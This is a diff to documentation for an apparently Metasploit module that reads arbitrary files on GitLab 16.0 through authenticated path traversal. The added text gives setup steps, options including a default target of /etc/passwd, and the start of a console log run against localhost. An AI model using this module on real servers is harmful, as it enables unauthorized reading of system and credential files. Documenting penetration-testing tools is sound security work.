@@ -37,7 +37,36 @@ gitlab/gitlab-ee:16.0.0-ee.0
 To retrieve the default password:
 
 ```
-sudo docker exec -it gitlab grep 'Password:' /etc/gitlab/initial_root_password[*] Processing gitlab.rb for ERB directives.
+sudo docker exec -it gitlab grep 'Password:' /etc/gitlab/initial_root_password
+```
+
+## Verification Steps
+
+1. Install the application
+1. Start msfconsole
+1. Do: `use auxiliary/scanner/http/gitlab_authenticated_subgroups_file_read`
+1. Do: `set rhosts [ip]`
+1. Do: `set username [username]`
+1. DO: `set password [password]`
+1. Do: `run`
+1. You should be able to read an arbitrary file.
+
+## Options
+
+### DEPTH
+
+Depth for path traversal (also groups creation). 11 seems pretty safe but it may work with less. Defaults to `11`.
+
+### FILE
+
+File to read. Defaults to `/etc/passwd`
+
+## Scenarios
+
+### Docker GitLab 16.0
+
+```
+[*] Processing gitlab.rb for ERB directives.
 resource (gitlab.rb)> use auxiliary/gather/gitlab_authenticated_subgroups_file_read
 resource (gitlab.rb)> set rhosts 127.0.0.1
 rhosts => 127.0.0.1
